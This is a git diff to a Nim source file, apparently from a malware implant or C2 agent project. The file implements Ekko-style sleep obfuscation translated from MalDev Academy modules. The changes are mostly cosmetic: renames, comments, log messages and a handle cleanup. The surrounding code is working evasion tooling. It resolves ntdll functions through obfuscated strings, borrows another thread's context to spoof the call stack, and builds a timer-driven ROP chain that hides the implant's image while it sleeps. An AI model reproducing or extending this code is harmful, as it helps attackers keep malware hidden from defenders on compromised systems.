@@ -1,13 +1,14 @@
 import winim/lean
 import winim/inc/tlhelp32
-import os, strformat
+import os, system, strformat
 import ../../common/[types, utils, crypto] 
 
 import sugar
 
 # Sleep obfuscation implementation based on Ekko, originally developed by C5pider 
-# The code in this file was taken from the MalDev Academy modules 54,56 & 59 and translated from C to Nim
-# https://maldevacademy.com/new/modules/54?view=blocks
+# The code in this file was taken from the MalDev Academy modules 54, 56 & 59 and translated from C to Nim
+# https://maldevacademy.com/new/modules/54
+# https://maldevacademy.com/new/modules/56
 
 type 
     USTRING* {.bycopy.} = object 
@@ -28,7 +29,7 @@ proc NtSignalAndWaitForSingleObject(hSignal: HANDLE, hWait: HANDLE, alertable: B
 proc NtDuplicateObject(hSourceProcess: HANDLE, hSource: HANDLE, hTargetProcess: HANDLE, hTarget: PHANDLE, desiredAccess: ACCESS_MASK, attributes: ULONG, options: ULONG ): NTSTATUS {.cdecl, stdcall, importc: protect("NtDuplicateObject"), dynlib: protect("ntdll.dll").}
 
 # Function for retrieving a random thread's thread context for stack spoofing
-proc getRandomThreadCtx(): CONTEXT = 
+proc GetRandomThreadCtx(): CONTEXT = 
     
     var 
         ctx: CONTEXT
@@ -57,11 +58,11 @@ proc getRandomThreadCtx(): CONTEXT =
                 continue 
             
             # Retrieve thread context
-            ctx.ContextFlags = CONTEXT_ALL
+            ctx.ContextFlags = CONTEXT_ALL # This setting is required to be able to fill the CONTEXT structure
             if GetThreadContext(hThread, addr ctx) == 0: 
                 continue
 
-            echo protect("[*] Spoofing with call stack of thread "), $thd32Entry.th32ThreadID
+            echo fmt"[*] Using thread {thd32Entry.th32ThreadID} for stack spoofing."
             break     
 
     return ctx
@@ -71,8 +72,8 @@ proc sleepEkko*(sleepDelay: int) =
     
     var 
         status: NTSTATUS = 0
-        key: USTRING = USTRING(Length: 0)
         img: USTRING = USTRING(Length: 0)
+        key: USTRING = USTRING(Length: 0)
         ctx: array[10, CONTEXT]
         ctxInit: CONTEXT
         ctxBackup: CONTEXT
@@ -128,7 +129,7 @@ proc sleepEkko*(sleepDelay: int) =
         defer: CloseHandle(hEventEnd)
 
         # Retrieve a random thread context from the current process
-        ctxSpoof = getRandomThreadCtx() 
+        ctxSpoof = GetRandomThreadCtx() 
 
         # Retrieve the initial thread context
         status = RtlCreateTimer(queue, addr timer, RtlCaptureContext, addr ctxInit, 0, 0, WT_EXECUTEINTIMERTHREAD)
@@ -146,6 +147,7 @@ proc sleepEkko*(sleepDelay: int) =
         status = NtDuplicateObject(GetCurrentProcess(), GetCurrentThread(), GetCurrentProcess(), addr hThread, THREAD_ALL_ACCESS, 0, 0)
         if status != STATUS_SUCCESS: 
             raise newException(CatchableError, $status.toHex())
+        defer: CloseHandle(hThread)
 
         # Preparing the ROP chain 
         # Initially, each element in this array will have the same context as the timer's thread context
@@ -217,9 +219,10 @@ proc sleepEkko*(sleepDelay: int) =
             if status != STATUS_SUCCESS: 
                 raise newException(CatchableError, $status.toHex())
             
-        echo protect("[*] Triggering sleep obfuscation")
+        echo protect("[*] Triggering sleep obfuscation.")
 
         status = NtSignalAndWaitForSingleObject(hEventStart, hEventEnd, FALSE, NULL)
+
         if status != STATUS_SUCCESS: 
             raise newException(CatchableError, $status.toHex())
 
